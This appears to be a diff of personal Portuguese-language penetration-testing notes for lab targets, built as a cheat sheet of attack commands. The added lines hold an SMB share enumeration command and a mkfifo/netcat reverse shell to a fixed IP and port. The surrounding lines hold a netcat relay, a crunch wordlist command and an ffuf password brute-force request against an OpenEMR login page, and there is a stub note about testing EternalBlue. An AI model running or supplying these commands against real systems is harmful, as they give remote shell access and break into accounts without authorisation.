@@ -18,11 +18,27 @@ ponto de injeção passo para vitima o código malicioso
 
 ponto de execução realizo a execução
 
+smbmap - H 192.168.10.203 -U anonymous -s sharede
+
+quando o login não é anonimo eu posso usar qualquer uma 
+
+
 pesquisar no google > <webservice> url login first steps documentation
  crunch 7 7 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t s1lKy@@ > oi.txt
 
 mkfifo p
 nc -vlnp 1234 0<p | nc -nv 172.16.100.10 1234 1>p
 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.125 5555 >/tmp/f
+
 
 ffuf -w senhas.txt -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate'  -H 'Content-Type: application/x-www-form-urlencoded' -H 'Referer: http://192.168.9.43:8081/openemr-5.0.1/interface/login/login.php?site=default' -d 'new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=FUZZ&languageChoice=1' -u 'http://192.168.9.43:8081/openemr-5.0.1/interface/main/main_screen.php?auth=login&site=default' -c
+
+
+
+maneira de testar eternal blue 
+
+
+
+
+
